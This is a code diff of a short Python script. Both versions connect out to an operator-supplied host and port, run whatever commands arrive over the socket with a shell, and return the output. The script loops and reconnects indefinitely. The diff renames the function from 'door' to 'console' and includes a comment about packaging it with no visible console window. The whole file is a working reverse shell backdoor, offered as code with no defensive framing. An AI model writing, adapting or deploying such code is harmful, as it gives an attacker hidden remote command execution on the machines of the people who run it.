@@ -1,25 +1,25 @@
 #!/usr/bin/env python
 import os
-import time
-from socket import*
+from time import sleep
+from subprocess import Popen, PIPE
+from socket import socket, AF_INET, SOCK_STREAM
 
-def door(h, p, w=16):
+def console(h, p, w=16):
     while 6:
         try:
-            def CE(F):
-                try: return F()
-                except:
-                    return
             C = socket(AF_INET, SOCK_STREAM)
             C.connect((h, int(p)))
             S, R = C.send, C.recv
-            T = lambda I: I("utf-8")
-            E = lambda I: T(I.encode)
-            D = lambda I: T(I.decode)
-            while 6: S(CE(lambda: E(os.popen(D(R(1024))).read())) or b"\xff")
+            NORESP = b"\xff"
+            D = lambda I: I.decode("utf-8")
+            A = lambda I: I.stdout.read() or I.stderr.read() or NORESP
+            # pyinstaller --noconsole, Popen [Error 6]
+            # https://bugs.python.org/issue3905#msg73408
+            E = lambda I: Popen(I, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+            while 6: S(A(E(D(R(1024)))))
         except Exception:
-            time.sleep(w)
+            sleep(int(w))
 
 if __name__ == "__main__":
     import sys
-    door(*sys.argv[1].split(":"))
+    console(*sys.argv[1].split(":"))
